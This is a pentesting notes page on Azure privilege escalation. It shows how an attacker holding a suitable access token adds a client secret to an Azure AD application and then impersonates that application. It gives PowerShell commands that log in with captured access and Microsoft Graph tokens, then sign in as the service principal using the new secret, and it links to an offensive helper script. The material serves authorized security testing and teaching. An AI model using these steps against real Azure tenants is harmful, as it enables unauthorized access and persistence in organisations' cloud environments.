---
title: Add secrets to app
source_url: https://notes.incendium.rocks/pentesting-notes/cloud/azure/privilege-escalation/add-secrets-to-app
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: cloud
---

If you have a access\_token that is able to `Get-AzADApplication`:

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FJGI4SycRJ83YY2wqoDMf%2Fimage.png?alt=media&amp;token=ada7f4dc-10f1-44a5-b4cf-52b1ccdc0366" alt=""><figcaption></figcaption></figure>

It is possible to check if that access\_token can set a secret on that app using a script: <https://github.com/lutzenfried/OffensiveCloud/blob/main/Azure/Tools/Add-AzADAppSecret.ps1>.

To abuse, you will need a access\_token and the MicrosoftGraphToken!

```powershell
Connect-AzAccount -AccessToken $token -MicrosoftGraphAccessToken $graphtoken -AccountId 62e44426-5c46-4e3c-8a89-xxxxxx
```

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FtSOJWOOZZdm5kjdk3J2d%2Fimage.png?alt=media&amp;token=c9e80e0b-ac66-43d1-95da-a756f0adf739" alt=""><figcaption></figcaption></figure>

Now, using these secret we can impersonate that application:

```powershell
$password = ConvertTo-SecureString 'client secret' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('f072c4a6-b440-40de-xxxxxxx', $password)
Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant 2d50cb29-5f7b-48a4-87ce-xxxxxxxx
```
